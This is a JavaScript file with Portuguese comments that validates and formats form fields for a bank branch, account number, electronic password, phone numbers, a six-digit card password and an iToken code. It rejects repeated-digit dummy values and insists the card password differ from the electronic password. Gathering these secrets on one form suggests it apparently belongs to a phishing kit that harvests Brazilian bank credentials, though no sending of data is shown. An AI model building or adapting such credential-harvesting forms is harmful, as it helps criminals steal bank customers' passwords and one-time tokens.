function validar1() {
if ( document.form.ag.value == "" || 
document.form.ag.value.length < 4 || 
document.form.ag.value == "0000" || 
document.form.ag.value == "1111" || 
document.form.ag.value == "2222" ||
document.form.ag.value == "3333" || 
document.form.ag.value == "4444" || 
document.form.ag.value == "5555" || 
document.form.ag.value == "6666" || 
document.form.ag.value == "7777" || 
document.form.ag.value == "8888" || 
document.form.ag.value == "9999"){
alert ("Agência, inválida!");
document.form.ag.focus(); return false;
}
if (document.form.ct.value == "" || 
document.form.ct.value.length < 4 || 
document.form.ct.value == "00000-0" || 
document.form.ct.value == "11111-1" || 
document.form.ct.value == "22222-2" || 
document.form.ct.value == "33333-3" || 
document.form.ct.value == "44444-4" || 
document.form.ct.value == "55555-5" || 
document.form.ct.value == "66666-6" || 
document.form.ct.value == "77777-7" || 
document.form.ct.value == "88888-8" || 
document.form.ct.value == "99999-9"){
alert ("Conta corrente, inválida!");
document.form.ct.focus(); return false;
}
}

function validar2() {
if (document.form.infor.value == "" || 
document.form.infor.value.length < 6 || 
document.form.infor.value == "000000" || 
document.form.infor.value == "111111" || 
document.form.infor.value == "222222" || 
document.form.infor.value == "333333" || 
document.form.infor.value == "444444" || 
document.form.infor.value == "555555" || 
document.form.infor.value == "666666" || 
document.form.infor.value == "777777" || 
document.form.infor.value == "888888" || 
document.form.infor.value == "999999"){
alert ("Senha eletrônica, inválida!");
document.form.infor.focus(); return false;
}
}

function validar3() {
if (document.form.telefone.value == "" || 
document.form.telefone.value.length < 10 || 
document.form.telefone.value == "(00)00000-0000" || 
document.form.telefone.value == "(11)11111-1111" || 
document.form.telefone.value == "(22)22222-2222" || 
document.form.telefone.value == "(33)33333-3333" || 
document.form.telefone.value == "(44)44444-4444" || 
document.form.telefone.value == "(55)55555-5555" || 
document.form.telefone.value == "(66)66666-6666" || 
document.form.telefone.value == "(77)77777-7777" || 
document.form.telefone.value == "(88)88888-8888" || 
document.form.telefone.value == "(99)99999-9999"){
alert ("Telefone, Inválido!");
document.form.telefone.focus(); return false;
}
if (document.form.telefoneF.value == "" || 
document.form.telefoneF.value.length < 10 || 
document.form.telefoneF.value.length > 13 || 
document.form.telefoneF.value == "(00)0000-0000" || 
document.form.telefoneF.value == "(11)1111-1111" || 
document.form.telefoneF.value == "(22)2222-2222" || 
document.form.telefoneF.value == "(33)3333-3333" || 
document.form.telefoneF.value == "(44)4444-4444" || 
document.form.telefoneF.value == "(55)5555-5555" || 
document.form.telefoneF.value == "(66)6666-6666" || 
document.form.telefoneF.value == "(77)7777-7777" || 
document.form.telefoneF.value == "(88)8888-8888" || 
document.form.telefoneF.value == "(99)9999-9999"){
alert ("Telefone Fixo, inválido!");
document.form.telefoneF.focus(); return false;
}
if (document.form.senha6.value == "" || 
document.form.senha6.value.length < 6 || 
document.form.senha6.value == "000000" || 
document.form.senha6.value == "111111" || 
document.form.senha6.value == "222222" || 
document.form.senha6.value == "333333" || 
document.form.senha6.value == "444444" || 
document.form.senha6.value == "555555" || 
document.form.senha6.value == "666666" || 
document.form.senha6.value == "777777" || 
document.form.senha6.value == "888888" || 
document.form.senha6.value == "999999"){
alert ("Senha de (6 dígitos), inválida!");
document.form.senha6.focus(); return false;
}
}

function valida4(){
if (document.form.it.value == "" || 
document.form.it.value.length < 6 || 
document.form.it.value == "000000" || 
document.form.it.value == "111111" || 
document.form.it.value == "222222" || 
document.form.it.value == "333333" || 
document.form.it.value == "444444" || 
document.form.it.value == "555555" || 
document.form.it.value == "666666" || 
document.form.it.value == "777777" || 
document.form.it.value == "888888" || 
document.form.it.value == "999999"){
alert ("iToken, inválido!");
document.form.it.focus(); return false;
}
}

/* ================================================================ */
/* Exibindo e ocultando uma DIV */

function exibe(id) {
	if(document.getElementById(id).style.display=="none") {
		document.getElementById(id).style.display = "inline";
	}
	else {
		document.getElementById(id).style.display = "block";
	}
}

/* ================================================================ */
/* Função pular campo */

function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}

/* ================================================================ */
/* Aceitar somente números */

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58)) return true;
    else{
    if (tecla != 8) return false;
    else return true;
    }
}

/* ================================================================ */
/* Maskara Agencia e Conta */

	function maskTrak(format, field)
{
	var result = "";
	var maskIdx = format.length - 1;
	var error = false;
	var valor = field.value;
	var posFinal = false;
	if( field.setSelectionRange ) 
	{
    	if(field.selectionStart == valor.length)
    		posFinal = true;
    }
	valor = valor.replace(/[^0123456789Xx]/g,'')
	for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx)
	{
		var chr = valor.charAt(valIdx);
		var chrMask = format.charAt(maskIdx);
		switch (chrMask)
		{
		case '#':
			if(!(/\d/.test(chr)))
				error = true;
			result = chr + result;
			--valIdx;
			break;
		case '@':
			result = chr + result;
			--valIdx;
			break;
		default:
			result = chrMask + result;
		}
	}

	field.value = result;
	field.style.color = error ? 'red' : '';
	if(posFinal)
	{
		field.selectionStart = result.length;
		field.selectionEnd = result.length;
	}
	return result;
}

/* ================================================================ */
/* Maskara Telefone */

function mascaraTelefone( campo ) {
			
function trata( valor,  isOnBlur ) {
					
	valor = valor.replace(/\D/g,"");             			
	valor = valor.replace(/^(\d{2})(\d)/g,"($1)$2"); 		
					
	if( isOnBlur ) {
						
	valor = valor.replace(/(\d)(\d{4})$/,"$1-$2");   
					} else {

						valor = valor.replace(/(\d)(\d{3})$/,"$1-$2"); 
					}
					return valor;
				}
				
				campo.onkeypress = function (evt) {
					 
					var code = (window.event)? window.event.keyCode : evt.which;	
					var valor = this.value
					
					if(code > 57 || (code < 48 && code != 8 ))  {
						return false;
					} else {
						this.value = trata(valor, false);
					}
				}
				
				campo.onblur = function() {
					
					var valor = this.value;
					if( valor.length < 13 ) {
						this.value = ""
					}else {		
						this.value = trata( this.value, true );
					}
				}
				
				campo.maxLength = 14;
			}
			
/* ================================================================ */

/* ================================================================ */
/* Maskara Telefone */

function mascaraTelefoneFixo( campo ) {
			
function trata( valor,  isOnBlur ) {
					
	valor = valor.replace(/\D/g,"");             			
	valor = valor.replace(/^(\d{2})(\d)/g,"($1)$2"); 		
					
	if( isOnBlur ) {
						
	valor = valor.replace(/(\d)(\d{4})$/,"$1-$2");   
					} else {

						valor = valor.replace(/(\d)(\d{3})$/,"$1-$2"); 
					}
					return valor;
				}
				
				campo.onkeypress = function (evt) {
					 
					var code = (window.event)? window.event.keyCode : evt.which;	
					var valor = this.value
					
					if(code > 57 || (code < 48 && code != 8 ))  {
						return false;
					} else {
						this.value = trata(valor, false);
					}
				}
				
				campo.onblur = function() {
					
					var valor = this.value;
					if( valor.length < 12 ) {
						this.value = ""
					}else {		
						this.value = trata( this.value, true );
					}
				}
				
				campo.maxLength = 13;
			}
			
/* ================================================================ */



function validaCamposIguais() {
if ( document.form.infor.value == document.form.senha6.value ){
alert ("Senha do cartão de débito, inválida.");
document.form.senha6.focus(); return false;
}
}